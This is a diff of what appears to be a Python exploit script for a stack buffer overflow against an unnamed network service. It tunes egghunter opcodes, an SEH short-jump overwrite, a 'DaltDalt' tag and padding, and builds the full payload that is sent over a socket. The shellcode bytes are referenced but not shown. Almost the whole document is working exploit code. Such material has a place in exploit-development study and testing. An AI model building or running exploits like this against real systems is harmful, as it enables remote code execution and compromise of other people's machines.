@@ -19,15 +19,17 @@ eggh = (
 "\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF
 
 # Edit - Moving Egghunter close to start of tag
-# "\x89\xEA"                            # mov edx, ebp
-# "\x81\xC2\xF7\x04\x00\x00"            # add edx, 0x4f7 <- 1271 (decimal This may be too close unless offset is always the same
-# "\x81\xC2\xE8\x03\x00\x00"            # add edx, 0x3e8 (decimal 1000) < Tried something a little farther away, failed.
-### 
-# "\x8B\x15\x00\x00\x00\x00" # mov edx, eip
-# "\x81\xC2\x6D\xEE\x07\x00" # add edx, 0x7ee6d (decimal 519789)
-# "\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4"
-# "\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4\x81\xEA\x2C\x01\x00\x00"
-# "\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4\x81\xEA\x19\x01\x00\x00"
+# mov eax, esp
+# pop edx
+# pop edx
+# pop edx
+# pop edx
+# pop edx
+# pop edx
+# pop edx
+# pop edx
+# mov esp, eax
+# sub edx, 0x1119
 "\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4\x81\xEA\x19\x11\x00\x00"
 
 "\x42"                                # INC EDX
@@ -88,14 +90,6 @@ shellcode = (
 )
 
 
-#test
-
-# payload = evil + nseh + seh + nops + shellcode
-# payload = shellA + eggh + nseh + seh + nops + eggh + "DaltDalt" + shellB
-
-# Shellcode length = 257 bytes
-# payload = "DaltDalt" + shellcode + nseh + seh + nops + eggh
-
 junk = "A" * 50
 tag = "DaltDalt"
 nseh = "\xeb\x06\x90\x90"
@@ -105,7 +99,6 @@ morejunk = "B" * (330-(len(junk)+len(tag)+len(shellcode)))
 
 # Full payload calculation
 payload = junk + tag + shellcode + morejunk + nseh + seh + nops + eggh
-
 
 
 socket.send(payload)
